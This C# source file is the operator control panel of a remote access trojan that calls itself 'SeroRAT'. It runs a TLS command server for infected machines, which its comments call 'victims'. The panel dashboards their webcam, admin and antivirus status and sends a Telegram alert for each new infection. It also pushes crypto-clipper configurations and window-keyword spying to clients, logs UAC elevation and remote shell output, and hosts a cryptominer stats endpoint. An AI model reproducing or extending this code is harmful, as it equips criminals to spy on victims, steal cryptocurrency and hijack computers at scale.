    private void SetWinNotifyKeywordsLocked(bool locked)
    {
        WinNotifyLockIcon.Visibility = locked ? Visibility.Visible : Visibility.Collapsed;
        WnTelegramToken.IsEnabled    = !locked;
        WnTelegramChatId1.IsEnabled  = !locked;
        WnTelegramChatId2.IsEnabled  = !locked;
        WnTelegramToken.Opacity      = locked ? 0.45 : 1.0;
        WnTelegramChatId1.Opacity    = locked ? 0.45 : 1.0;
        WnTelegramChatId2.Opacity    = locked ? 0.45 : 1.0;
    }

    private void WinNotify_Changed(object sender, RoutedEventArgs e)
    {
        if (_loadingConfig) return;
        if (sender == WinNotifyEnabled)
        {
            bool enabled = WinNotifyEnabled.IsChecked == true;
            _winNotifyEnabled = enabled;
            SetWinNotifyKeywordsLocked(enabled);
            if (_server != null)
            {
                var clients = _server.ConnectedClients.Keys.ToList();
                if (clients.Count > 0)
                {
                    if (enabled)
                    {
                        var pktData = Newtonsoft.Json.JsonConvert.SerializeObject(
                            new { Keywords = WinNotifyKeywordsList.Items.Cast<string>().ToArray() });
                        var srv = _server;
                        _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
                            async (id, _) =>
                            {
                                try { await srv.SendToClient(id, new Packet { Type = PacketType.WindowNotifyKeywords, Data = pktData }); } catch { }
                            }));
                    }
                    else
                        _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
                            async (id, _) => await SendEmptyWinNotifyKeywords(id)));
                }
            }
        }
        SaveConfig();
    }

    private async Task SendEmptyWinNotifyKeywords(string clientId)
    {
        if (_server == null) return;
        await _server.SendToClient(clientId, new Packet
        {
            Type = PacketType.WindowNotifyKeywords,
            Data = Newtonsoft.Json.JsonConvert.SerializeObject(new { Keywords = Array.Empty<string>() })
        });
    }

    private void ClearAllWinNotifyLog_Click(object sender, RoutedEventArgs e)
        => _winNotifyEntries.Clear();

    private void ClearWinNotifyLog_Click(object sender, RoutedEventArgs e)
    {
        if (GridWinNotify.SelectedItem is WinNotifyEntry sel)
            _winNotifyEntries.Remove(sel);
    }

    private void WinNotifyGoToClient_Click(object sender, RoutedEventArgs e)
    {
        if (GridWinNotify.SelectedItem is not WinNotifyEntry entry || string.IsNullOrEmpty(entry.ClientId)) return;
        _onlineById.TryGetValue(entry.ClientId, out var client);
        if (client == null) return;
        if (NavOnline != null) NavOnline.IsChecked = true;
        GridClients.SelectedItem = client;
        GridClients.ScrollIntoView(client);
        GridClients.Focus();
    }

    private void GridWinNotify_PreviewMouseRightButtonDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
    {
        var row = FindVisualAncestor<DataGridRow>(e.OriginalSource as DependencyObject);
        if (row != null)
        {
            GridWinNotify.SelectedItem = row.Item;
        }
    }

    // ── Server-side Telegram notification (global counter) ──────────────────────
    // Fires when a brand-new HWID connects — uses the server's DataStore count
    // so the number is truly global across all victims, not per-machine.
    private async Task ServerTelegramNotifyAsync(Data.ConnectedClient c)
    {
        try
        {
            var token   = BldTelegramToken.Text.Trim();
            var chatId1 = BldTelegramChatId1.Text.Trim();
            var chatId2 = BldTelegramChatId2.Text.Trim();
            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;

            // Global count = total unique HWIDs the server has ever seen
            int count   = _store.AllClients.Count;
            var admin   = c.IsAdmin ? "Yes" : "No";
            var country = string.IsNullOrEmpty(c.Country) ? "N/A" : c.Country;
            var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
            var paris   = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz)
                              .ToString("yyyy-MM-dd HH:mm") + " (Paris)";

            var clientLabel = $"{TgOrdinal(count)} client";
            var msg =
                $"{clientLabel} - SeroRAT\n\n" +
                $"ID: {c.Id}\n" +
                $"User: {c.Username}@{c.MachineName}\n" +
                $"IP: {c.IP}\n" +
                $"Country: {country}\n" +
                $"CPU: {c.CpuName}\n" +
                $"OS: {c.OS}\n" +
                $"Admin: {admin}\n" +
                $"AV: {c.Antivirus}\n" +
                $"Time: {paris}";

            var targets = new List<string> { chatId1 };
            if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

            foreach (var id in targets)
            {
                try
                {
                    var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                              $"?chat_id={Uri.EscapeDataString(id)}" +
                              $"&text={Uri.EscapeDataString(msg)}";
                    await _telegramHttp.GetAsync(url);
                }
                catch { }
            }
        }
        catch { }
    }

    private static string TgOrdinal(int n)
    {
        string suffix = (n % 100) switch
        {
            11 or 12 or 13 => "th",
            _ => (n % 10) switch { 1 => "st", 2 => "nd", 3 => "rd", _ => "th" }
        };
        return $"{n}{suffix}";
    }


    // ── Server Control ──────────────────────────────

    private void TxtPort_PreviewTextInput(object sender, System.Windows.Input.TextCompositionEventArgs e)
    {
        e.Handled = !e.Text.All(char.IsDigit);
        if (!e.Handled)
        {
            var tb = (System.Windows.Controls.TextBox)sender;
            var next = tb.Text.Remove(tb.SelectionStart, tb.SelectionLength).Insert(tb.SelectionStart, e.Text);
            if (int.TryParse(next, out int v) && v > 65535) e.Handled = true;
        }
    }

    private void TxtPort_Pasting(object sender, DataObjectPastingEventArgs e)
    {
        if (e.DataObject.GetDataPresent(typeof(string)))
        {
            var text = (string)e.DataObject.GetData(typeof(string));
            if (!text.All(char.IsDigit) || (int.TryParse(text, out int v) && v > 65535))
                e.CancelCommand();
        }
        else e.CancelCommand();
    }

    private void ServerWindow_Closing(object sender, System.ComponentModel.CancelEventArgs e)
    {
        if (WindowState == WindowState.Normal)
        {
            UiPrefs.Set("WinLeft",   (int)Left);
            UiPrefs.Set("WinTop",    (int)Top);
            UiPrefs.Set("WinWidth",  (int)ActualWidth);
            UiPrefs.Set("WinHeight", (int)ActualHeight);
        }
        UiPrefs.Set("ActiveNav", MainTabControl.SelectedIndex);
        CleanupColumnPersistence();
        SaveConfig();
        foreach (var w in _featureWindows.Values.ToList())
            try { w.Close(); } catch { }
        _featureWindows.Clear();
        _tikTokWindow?.Close();   _tikTokWindow = null;
        _server?.Stop();
        _idleTimer.Stop();
        _signalTimer.Stop();
        _dashTimer.Stop();
        _uptimeTimer.Stop();
        Application.Current.Shutdown();
    }

    private void StartStop_Click(object sender, RoutedEventArgs e)
    {
        if (_server is { IsRunning: true })
        {
            NotificationService.PlayShutdown();
            _server.Stop();
            _minerStatsHost?.Stop();
            _minerStatsHost = null;
            _dashTimer.Stop();
            _uptimeTimer.Stop();
            _discordRpc?.Stop();
            _discordRpc = null;
            TxtPort.IsEnabled = true;
            SetServerStatus(false);
            BtnStartStop.Content = Lang.Get("ACT_START").ToUpper();
            BtnStartStop.Style = (Style)FindResource("SGreenBtn");
            _server = null;
            while (_clientQueue.TryDequeue(out _)) { }  // drain pending ops
            _onlineClients.Clear();
            _onlineById.Clear();
            UpdateClientCount();
            ScreenPanel.Children.Clear();
            _screenTiles.Clear();

            // Close all feature windows
            foreach (var window in _featureWindows.Values.ToList())
            {
                try { window.Close(); }
                catch { }
            }
            _featureWindows.Clear();

            // Close other open windows
            _tikTokWindow?.Close();
            _tikTokWindow = null;

            // Status is now handled by the Activity Panel
            Log("[*] Server stopped.");
        }
        else
        {
            if (!int.TryParse(TxtPort.Text, out int port) || port < 1 || port > 65535)
            {
                Log("[!] Invalid port.");
                return;
            }

            SaveConfig();

            try
            {
                _server = new TlsServer(_store);
                _server.OnLog += msg => Dispatcher.BeginInvoke(() => Log(msg));
                _server.ClientConnected += c =>
                {
                    DiagnosticLogger.ClientConnect(c.Id, c.IP, c.Username, c.OS);
                    // UI update is batched — enqueue and let _batchTimer flush at 150ms intervals
                    _clientQueue.Enqueue((true, c));

                    // Side effects: run on thread pool, capped at 50 concurrent to avoid
                    // flooding the ThreadPool when thousands of clients connect simultaneously.
                    _ = Task.Run(async () =>
                    {
                        await _connectSem.WaitAsync();
                        try
                        {

                        bool isNewHwid = !_store.AllClients.TryGetValue(c.Hwid, out var rec)
                                         || rec.ActivityLog.Count <= 1;
                        NotificationService.NotifyConnected(c.Id, isNewHwid);

                        var atSnapshot = _autoTasksSnap;
                        if (atSnapshot != null)
                            await ExecuteAutoTasksForClient(c, atSnapshot.ToList());

                        if (isNewHwid && _telegramEnabled)
                            _ = ServerTelegramNotifyAsync(c);

                        var cachedClipperJson = _clipperConfigJsonCache;
                        if (_clipperRunning && _server != null && cachedClipperJson != null)
                            await _server.SendToClient(c.Id, new Packet
                            {
                                Type = PacketType.ClipperSetConfig,
                                Data = cachedClipperJson
                            });

                        await SendWindowNotifyKeywords(c.Id);

                        } // end try
                        finally { _connectSem.Release(); }
                    });
                };
                _server.ClientDisconnected += c =>
                {
                    DiagnosticLogger.ClientDisconnect(c.Id, "TCP session closed");
                    NotificationService.NotifyDisconnected(c.Id);
                    // UI update batched — feature window closing handled in FlushClientQueue
                    _clientQueue.Enqueue((false, c));
                };
                _server.ElevationResultReceived += (clientId, data) => Dispatcher.BeginInvoke(() =>
                {
                    var status = data.Success ? "ELEVATED" : "FAILED";
                    Log($"[UAC] Client {clientId}: {status} - {data.Message}");
                    if (data.Success) RefreshClients();
                });

                // Crypto Clipper detections → global Clipper tab log
                _server.ClipperDetectedReceived += (clientId, data) =>
                    Dispatcher.BeginInvoke(() => HandleClipperDetected(clientId, data));

                // Window Notify alerts
                _server.WindowNotifyAlertReceived += (clientId, data) =>
                    _ = Dispatcher.InvokeAsync(() => HandleWindowNotifyAlert(clientId, data));

                // Log autotask shell output separately (not routed to RemoteShellWindow)
                _server.AutoTaskShellOutputReceived += (clientId, output) => Dispatcher.BeginInvoke(() =>
                {
                    if (string.IsNullOrWhiteSpace(output)) return;
                    var display = clientId.Length > 8 ? clientId[..8] : clientId;
                    foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
                        Log($"[AT:{display}] {line.TrimEnd('\r')}");
                });

                // Set auth key, client ID prefix, and max clients
                var authKey = BldAuthKey.Text.Trim();
                if (string.IsNullOrEmpty(authKey))
                {
                    Log("[!] Auth key is required. Generate one in the Builder tab first.");
                    return;
                }
                _server.AuthKey = authKey;
                var clientIdPrefix = BldClientIdPrefix.Text.Trim();
                _server.GetClientIdPrefix = () => clientIdPrefix;
                if (int.TryParse(SettingsMaxClients.Text, out int maxClients) && maxClients > 0)
                    _server.MaxConnectedClients = maxClients;
                _server.Start(port);

                // Start integrated miner stats endpoint
                var mnrToken = EnsureMinerToken();
                var mnrPort = MinerStatsPort;
                _minerStatsHost = new Net.MinerStatsHost(mnrPort, mnrToken);
                try { _minerStatsHost.Start(); }
                catch (Exception mex) { Log($"[!] Miner stats host failed: {mex.Message}"); }

                NotificationService.PlayStartup();
                _serverStartedAt = DateTime.UtcNow;
                // Auto-fill port checker with the active listening port
                SettingsCheckPort.Text = port.ToString();
                TxtPort.IsEnabled = false;
                SetServerStatus(true);
                BtnStartStop.Content = Lang.Get("ACT_STOP").ToUpper();
                BtnStartStop.Style = (Style)FindResource("SRedBtn");
                _dashTimer.Start();
                _uptimeTimer.Start();
                // Status is now handled by the Activity Panel

                // Discord RPC
                if (SettingsDiscordRPC.IsChecked == true)
                {
                    try
                    {
                        _discordRpc = new Net.SeroDiscordRPC();
                        _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Log($"[!] Failed to start: {ex.Message}");
            }
        }
    }

    private void SetServerStatus(bool running)
    {
        var brush = running
            ? (Brush)FindResource("GreenBrush")
            : (Brush)FindResource("RedBrush");

        ServerDot.Fill = brush;
        TxtServerStatus.Text = running ? Lang.Get("SERVER_LISTENING") : Lang.Get("SERVER_STOPPED");
    }

    private void UpdateClientCount()
    {
        var count = _server?.ConnectedClients.Count ?? 0;
        TxtClientCount.Text = $"  ·  {count} clients";
    }

    // Flush queued connect/disconnect operations in a single batch → one CollectionChanged (Reset)
    private void FlushClientQueue(object? s, EventArgs e)
    {
        if (_clientQueue.IsEmpty) return;

        // Use Dictionary for O(1) dedup instead of List.RemoveAll / List.Any → O(N²) at 10k clients
        var toAdd    = new Dictionary<string, ConnectedClient>();
        var toRemove = new Dictionary<string, ConnectedClient>();
        var toClose  = new HashSet<string>();

        while (_clientQueue.TryDequeue(out var op))
        {
            if (op.add)
            {
                // Reconnect with same ID: cancel any pending remove for this ID and replace entry.
                toRemove.Remove(op.client.Id);
                toClose.Remove(op.client.Id);
                if (_onlineById.TryGetValue(op.client.Id, out var stale))
                    toRemove[op.client.Id] = stale; // evict stale entry
                toAdd[op.client.Id] = op.client;    // overwrites duplicate in O(1)
            }
            else
            {
                // Only remove if there is no pending re-add (reconnect already handled above)
                if (_onlineById.ContainsKey(op.client.Id) && !toAdd.ContainsKey(op.client.Id))
                {
                    toRemove[op.client.Id] = op.client;
                    toClose.Add(op.client.Id);
                }
            }
        }

        if (toRemove.Count > 0)
        {
            foreach (var c in toRemove.Values)
            {
                _onlineById.Remove(c.Id);
                if (_store.AllClients.TryGetValue(c.Hwid, out var rec)) rec.LiveClient = null;
            }
            _onlineClients.RemoveRange(toRemove.Values);
        }
        if (toAdd.Count > 0)
        {
            foreach (var c in toAdd.Values)
            {
                _onlineById[c.Id] = c;
                if (_store.AllClients.TryGetValue(c.Hwid, out var rec)) rec.LiveClient = c;
            }
            _onlineClients.AddRange(toAdd.Values);
            // AddRange already fires a Reset which re-applies the filter — no Refresh() needed.
        }

        // Close feature windows + remove screen tiles for disconnected clients
        foreach (var id in toClose)
        {
            var prefix = id + ":";
            var keys   = _featureWindows.Keys.Where(k => k.StartsWith(prefix, StringComparison.Ordinal)).ToList();
            foreach (var k in keys)
            {
                try { _featureWindows[k].Close(); } catch { }
            }

            // Remove screen tile immediately (don't wait for next RequestScreenshots tick)
            if (_screenBorders.TryGetValue(id, out var tb))
            {
                if (id == _focusedScreenId) ClearScreenFocus();
                ScreenPanel.Children.Remove(tb);
                _screenBorders.Remove(id);
                _screenTiles.Remove(id);
                // Also close popup if it was showing this client's screenshot
                if (ScreenPopupOverlay.Visibility == Visibility.Visible
                    && ScreenPopupSub.Text == id)
                    ScreenPopupOverlay.Visibility = Visibility.Collapsed;
            }
        }

        if (toAdd.Count > 0 || toRemove.Count > 0)
        {
            _clientsDirty = true;
            UpdateClientCount();
        }
    }

    private void RefreshClients()
    {
        if (_server == null) return;
        // O(n) sync using the dictionary — safe for 100k clients
        var current = _server.ConnectedClients;

        // Remove stale (O(n))
        var toRemove = _onlineClients.Where(c => !current.ContainsKey(c.Id)).ToList();
        if (toRemove.Count > 0)
        {
            foreach (var c in toRemove)
            {
                _onlineById.Remove(c.Id);
                if (_store.AllClients.TryGetValue(c.Hwid, out var rec)) rec.LiveClient = null;
            }
            _onlineClients.RemoveRange(toRemove);
        }

        // Add missing (O(n))
        var toAdd = current.Values.Where(c => !_onlineById.ContainsKey(c.Id)).ToList();
        if (toAdd.Count > 0)
        {
            foreach (var c in toAdd)
                _onlineById[c.Id] = c;
            _onlineClients.AddRange(toAdd); // one Reset instead of N individual Add events
        }
    }

    private void RefreshAllClients()
    {
        int currentPort = _server?.Port ?? 0;
        // No LINQ sort here — SortDescriptions on the view handle ordering so that
        // _allClientsView.Refresh() can re-sort cheaply without a full collection rebuild.
        var clients = _store.AllClients.Values
            .Where(r => currentPort == 0 || r.LastPort == 0 || r.LastPort == currentPort);
        var recordList = new ObservableCollection<ClientRecord>(clients);
        GridAllClients.ItemsSource = recordList;
        _allClientsView = System.Windows.Data.CollectionViewSource.GetDefaultView(recordList);
        if (_allClientsView != null)
        {
            using (_allClientsView.DeferRefresh())
            {
                _allClientsView.Filter = AllClientsFilter;
                _allClientsView.SortDescriptions.Clear();
                _allClientsView.SortDescriptions.Add(new System.ComponentModel.SortDescription(
                    nameof(Data.ClientRecord.HasTag), System.ComponentModel.ListSortDirection.Descending));
                _allClientsView.SortDescriptions.Add(new System.ComponentModel.SortDescription(
                    nameof(Data.ClientRecord.LastSeen), System.ComponentModel.ListSortDirection.Descending));
            }
        }
        foreach (var r in recordList)
            FlagCache.QueueLoadForRecord(r);
        if (TxtAllClientsCount != null)
            TxtAllClientsCount.Text = $"{_store.AllClients.Count} {Lang.Get("RECORDS_COUNT")}";
    }

    private void ClearOfflineClients_Click(object s, RoutedEventArgs e)
    {
        var onlineHwids = _server?.ConnectedClients.Values
            .Select(c => c.Hwid).ToHashSet(StringComparer.OrdinalIgnoreCase)
            ?? new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        var toRemove = _store.AllClients.Keys
            .Where(hwid => !onlineHwids.Contains(hwid)).ToList();
        foreach (var k in toRemove)
            _store.AllClients.TryRemove(k, out _);
        _store.Save();
        RefreshAllClients();
        Log($"[*] Cleared {toRemove.Count} offline client record(s).");
    }

    private void TxtAllClientsSearch_TextChanged(object sender, System.Windows.Controls.TextChangedEventArgs e)
    {
        if (_allClientsSearchDebounce == null)
        {
            _allClientsSearchDebounce = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(200) };
            _allClientsSearchDebounce.Tick += (_, _) =>
            {
                _allClientsSearchDebounce.Stop();
                _allClientsView?.Refresh();
            };
        }
        _allClientsSearchDebounce.Stop();
        _allClientsSearchDebounce.Start();
    }

    private bool AllClientsFilter(object obj)
    {
        if (obj is not Data.ClientRecord r) return false;
        var q = TxtAllClientsSearch?.Text?.Trim() ?? "";
        if (string.IsNullOrEmpty(q)) return true;
        return r.LastIP.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastUsername.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastMachineName.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastCountry.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastCountryCode.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.Tag.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastOS.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastAntivirus.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastCpuName.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.LastPayload.Contains(q, StringComparison.OrdinalIgnoreCase)
            || r.Hwid.Contains(q, StringComparison.OrdinalIgnoreCase);
    }

    private void RefreshUptime()
    {
        var uptime = DateTime.UtcNow - _serverStartedAt;
        DashUptime.Text = uptime.TotalHours >= 1
            ? $"{(int)uptime.TotalHours}h {uptime.Minutes}m {uptime.Seconds:D2}s"
            : $"{uptime.Minutes}m {uptime.Seconds:D2}s";
    }

    // ── Screenshot popup overlay ──────────────────────────────────────────
    private void ScreenPopupOverlay_Close(object sender, System.Windows.Input.MouseButtonEventArgs e)
        => ScreenPopupOverlay.Visibility = Visibility.Collapsed;

    private void ScreenPopupOverlay_CloseBtn(object sender, RoutedEventArgs e)
        => ScreenPopupOverlay.Visibility = Visibility.Collapsed;

    private void ScreenPopupOverlay_StopBubble(object sender, System.Windows.Input.MouseButtonEventArgs e)
        => e.Handled = true; // prevent click on the card from dismissing the overlay

    private void DashChart_SizeChanged(object sender, SizeChangedEventArgs e)
    {
        if (_chartSizeDebounce == null)
        {
            _chartSizeDebounce = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(100) };
            _chartSizeDebounce.Tick += (_, _) => { _chartSizeDebounce.Stop(); DrawActivityChart(); };
        }
        _chartSizeDebounce.Stop();
        _chartSizeDebounce.Start();
    }

    private void DrawActivityChart()
    {
        double w = DashChart.ActualWidth;
        double h = DashChart.ActualHeight;
        if (w <= 0 || h <= 0) return;

        // Build 24 hourly buckets from rolling connect history (O(k) where k = connects in 24h)
        var now    = DateTime.UtcNow;
        var counts = new int[24];
        foreach (var ts in _store.GetConnectHistory())
        {
            var age = (now - ts).TotalHours;
            if (age < 0 || age >= 24) continue;
            counts[23 - (int)age]++;
        }

        int rawMax = counts.Max();
        int peak = Math.Max(1, rawMax);
        DashPeak.Text = rawMax == 0 ? "—" : rawMax.ToString();

        // Remove previous dynamic children (keep Polyline and Polygon which are declared in XAML)
        for (int i = DashChart.Children.Count - 1; i >= 0; i--)
        {
            var child = DashChart.Children[i];
            if (child is System.Windows.Shapes.Line || child is TextBlock) DashChart.Children.RemoveAt(i);
        }

        // Horizontal grid lines
        var gridBrush = _chartGridBrush;
        for (int g = 1; g <= 3; g++)
        {
            double y = h * g / 4.0;
            var gl = new System.Windows.Shapes.Line
            {
                X1 = 0, X2 = w, Y1 = y, Y2 = y,
                Stroke = gridBrush, StrokeThickness = 1,
            };
            DashChart.Children.Add(gl);
        }

        // Build point collection
        double padL = 4, padR = 4, padT = 8, padB = 20;
        double chartW = w - padL - padR;
        double chartH = h - padT - padB;
        double step   = chartW / 23.0;

        var linePoints = new System.Windows.Media.PointCollection();
        var fillPoints = new System.Windows.Media.PointCollection();

        for (int i = 0; i < 24; i++)
        {
            double x = padL + i * step;
            double y = padT + chartH - (counts[i] / (double)peak) * chartH;
            linePoints.Add(new System.Windows.Point(x, y));
            fillPoints.Add(new System.Windows.Point(x, y));
        }
        // Close fill polygon at bottom corners
        fillPoints.Add(new System.Windows.Point(padL + 23 * step, padT + chartH));
        fillPoints.Add(new System.Windows.Point(padL, padT + chartH));

        DashChartLine.Points = linePoints;
        DashChartFill.Points = fillPoints;

        // Hour labels every 6h: -18h, -12h, -6h, now
        var labelBrush = _chartLabelBrush;
        foreach (int idx in new[] { 0, 6, 12, 18, 23 })
        {
            double x = padL + idx * step;
            var label = new TextBlock
            {
                Text       = idx == 23 ? "now" : $"-{23 - idx}h",
                Foreground = labelBrush,
                FontSize   = 8,
            };
            Canvas.SetLeft(label, x - 8);
            Canvas.SetTop(label,  h - padB + 3);
            DashChart.Children.Add(label);
        }
    }

    private void AnimateCounter(TextBlock tb, int to)
    {
        if (!int.TryParse(tb.Text, out int from) || from == to) { tb.Text = to.ToString(); return; }

        // Stop any previous animation on this TextBlock before starting a new one,
        // otherwise multiple timers pile up and fight over the same Text property.
        if (_counterTimers.TryGetValue(tb, out var prev)) { prev.Stop(); _counterTimers.Remove(tb); }

        int steps = 8, step = 0;
        double delta = (to - from) / (double)steps;
        var t = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(30) };
        _counterTimers[tb] = t;
        t.Tick += (_, _) =>
        {
            if (++step >= steps) { tb.Text = to.ToString(); t.Stop(); _counterTimers.Remove(tb); }
            else tb.Text = ((int)(from + delta * step)).ToString();
        };
        t.Start();
    }

    private void RefreshDashboard()
    {
        var online = _server?.ConnectedClients.Count ?? 0;
        var total  = _store.AllClients.Count;

        bool isFirst = !_dashboardInitialized;
        _dashboardInitialized = true;

        if (isFirst) { DashOnline.Text = online.ToString(); DashTotal.Text = total.ToString(); }
        else { AnimateCounter(DashOnline, online); AnimateCounter(DashTotal, total); }

        DashLastUpdated.Text = DateTime.Now.ToString("HH:mm:ss");

        // O(n) scan moved to background — at 100k records this blocked the UI thread for ~50ms
        _ = Task.Run(() =>
        {
            var cutoff24h = DateTime.UtcNow.AddHours(-24);
            int count = 0;
            foreach (var rec in _store.AllClients.Values)
                if (rec.LastConnectedAt >= cutoff24h) count++;
            Dispatcher.BeginInvoke(() => { if (isFirst) DashNew24h.Text = count.ToString(); else AnimateCounter(DashNew24h, count); });
        });

        // ── Tagged count — maintained live in DataStore, O(1) ─────────────
        DashTagged.Text = _store.TaggedCount.ToString();

        // ── Stat pills — 100k-client loop on background thread (no UI-thread block) ─────────────────
        var connDict = _server?.ConnectedClients;
        _ = Task.Run(() =>
        {
            int win11 = 0, win10 = 0, cam = 0, admin = 0, n = 0;
            var countryCounts = new Dictionary<string, int>();
            if (connDict != null)
            {
                foreach (var c in connDict.Values)
                {
                    n++;
                    if      (c.OS.Contains("11")) win11++;
                    else if (c.OS.Contains("10")) win10++;
                    if (c.CameraStatus.Equals("Yes", StringComparison.OrdinalIgnoreCase)) cam++;
                    if (c.IsAdmin) admin++;
                    if (!string.IsNullOrEmpty(c.Country) && c.Country != "...")
                    {
                        countryCounts.TryGetValue(c.Country, out int cc);
                        countryCounts[c.Country] = cc + 1;
                    }
                }
            }
            int other = n - win11 - win10;
            string? topKey = null; int topCnt = 0;
            foreach (var kv in countryCounts)
                if (kv.Value > topCnt) { topCnt = kv.Value; topKey = kv.Key; }
            Dispatcher.BeginInvoke(() =>
            {
                if (n > 0)
                {
                    DashWin11.Text   = $"{win11 * 100 / n}%";
                    DashWin10.Text   = $"{win10 * 100 / n}%";
                    DashOsOther.Text = $"{other * 100 / n}%";
                    DashWebcam.Text  = $"{cam   * 100 / n}%";
                    DashAdmin.Text   = $"{admin * 100 / n}%";
                    DashOsWin11Bar.Value = win11 * 100 / n;
                    DashOsWin10Bar.Value = win10 * 100 / n;
                    DashOsOtherBar.Value = other * 100 / n;
                    DashTopCountry.Text = topKey != null ? $"{topKey} ×{topCnt}" : "—";
                }
                else
                {
                    DashWin11.Text = DashWin10.Text = DashOsOther.Text = "—";
                    DashWebcam.Text = DashAdmin.Text = "—";
                    DashTopCountry.Text = "—";
                    DashOsWin11Bar.Value = DashOsWin10Bar.Value = DashOsOtherBar.Value = 0;
                }
            });
        });

        // ── 24h activity chart ──────────────────────────────────────────────
        DrawActivityChart();

        UpdateClientCount();

        if (_clientsDirty)
        {
            _clientsDirty = false;
            RefreshClients();
            // Only rebuild All Clients grid when that tab is visible — at 100k records the
            // O(n log n) sort + full ObservableCollection rebuild is too expensive to run
            // on every dashboard tick. Tab-switch handler calls RefreshAllClients() on demand.
            if (MainTabControl.SelectedIndex == 2)
                RefreshAllClients();
        }
        if (_autoTasksDirty) { _autoTasksDirty = false; GridAutoTasks.Items.Refresh(); }
    }

    // ── Client Actions ──────────────────────────────

    private List<ConnectedClient> GetSelectedClients()
    {
        return GridClients.SelectedItems.Cast<ConnectedClient>().ToList();
    }

    private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (_server == null || clients.Count == 0) return;
        string msg = clients.Count == 1
            ? $"Disconnect '{clients[0].Username}@{clients[0].IP}'?"
            : $"Disconnect {clients.Count} clients?";
        if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        // Parallel disconnect — send Disconnect packet then wait 150ms before force-removing,
        // all clients run concurrently so N clients take ~150ms total instead of N×150ms.
        await Task.WhenAll(clients.Select(async client =>
        {
            try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
            await Task.Delay(150);
            _server.DisconnectClient(client.Id);
        }));
    }

    // ── Column width persistence ──────────────────────────────────────────────

    // Per-column (full, min) pixel widths for the Online DataGrid.
    // Full = ideal at wide window. Min = minimum for content + header readability (all 10 langs).
    // ContentPresenter has Margin="10,9" → 20 px horizontal padding; min accounts for that.
    // Icon/number columns (CAM, LOAD, PING) have larger full widths to fit French headers.
    private static readonly Dictionary<string, (int full, int min)> _onlineColSpec =
        new(StringComparer.OrdinalIgnoreCase)
        {
            ["IP"]       = (120, 82),   // IPv4 "192.168.1.x" content
            ["STATUS"]   = (70,  58),   // "STATUT"(fr,6ch×6.5+20=59px) → 58 min
            ["COUNTRY"]  = (90,  60),   // flag + code
            ["USER"]     = (110, 85),   // "UTILISATEUR"(fr,11ch) / "Administrator" content
            ["OS"]       = (85,  55),
            ["MACHINE"]  = (90,  65),   // hostname content
            ["PRIV"]     = (105, 85),   // "PRIVILÈGE"(fr,9ch×6.5+20=79px) → 85 min
            ["ID"]       = (65,  46),
            ["CAM"]      = (64,  56),   // "CAMÉRA"(fr,6ch×6.5+20=59px) → 56 min; full=64
            ["CPU"]      = (120, 60),   // long content, always truncated
            ["LOAD"]     = (68,  58),   // "PAYLOAD"(7ch×6.5+20=66px) → 58 min; full=68
            ["AV"]       = (100, 65),
            ["RAM"]      = (75,  50),
            ["GPU"]      = (120, 60),   // long content, always truncated
            ["PING"]     = (54,  50),   // "PING"(4ch×6.5+20=46px) → 50 min; full=54
            ["WINDOW"]   = (115, 67),   // "FENÊTRE"(fr,7ch)
            ["1ST SEEN"] = (95,  75),   // "1ÈRE VUE"(fr,8ch×6.5+20=72px) + "2024-01-15" content
        };
    // kFull=1546 (sum of full widths), kMin=1077 (sum of minimum widths; fits 1366px laptop w/ ~220px sidebar)

    private void RestoreGridColumnWidths()
    {
        _autoFitColumns = UiPrefs.GetInt("AutoFitColumns", 0) == 1;
        bool hasSaved = false;
        foreach (var col in GridClients.Columns)
        {
            string h = GetOriginalKey(col);
            if (!string.IsNullOrEmpty(h) && h != "TAG" && UiPrefs.GetInt($"ColWidth_{h}", 0) > 20)
            { hasSaved = true; break; }
        }

        if (hasSaved && !_autoFitColumns)
        {
            foreach (var col in GridClients.Columns)
            {
                string header = GetOriginalKey(col);
                if (string.IsNullOrEmpty(header)) continue;
                if (header == "TAG")
                {
                    col.Width = new System.Windows.Controls.DataGridLength(1, System.Windows.Controls.DataGridLengthUnitType.Star);
                    continue;
                }
                int w = UiPrefs.GetInt($"ColWidth_{header}", 0);
                if (w > 20) col.Width = new System.Windows.Controls.DataGridLength(w);
            }
        }
        else
        {
            Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background,
                new Action(ApplyAdaptiveOnlineWidths));
        }
    }

    private void SetupGridColumnPersistence()
    {
        var desc = System.ComponentModel.DependencyPropertyDescriptor
            .FromProperty(System.Windows.Controls.DataGridColumn.WidthProperty,
                          typeof(System.Windows.Controls.DataGridColumn));
        foreach (var col in GridClients.Columns)
        {
            var c = col;
            if (GetOriginalKey(c) == "TAG")
            {
                // TAG must always stay Star — right-gripper drag converts it to Pixel; snap it back.
                // TAG is never auto-collapsed by squeezing: doing so would remove the star column
                // and leave a gap to the right. Users hide TAG via the settings panel checkbox only.
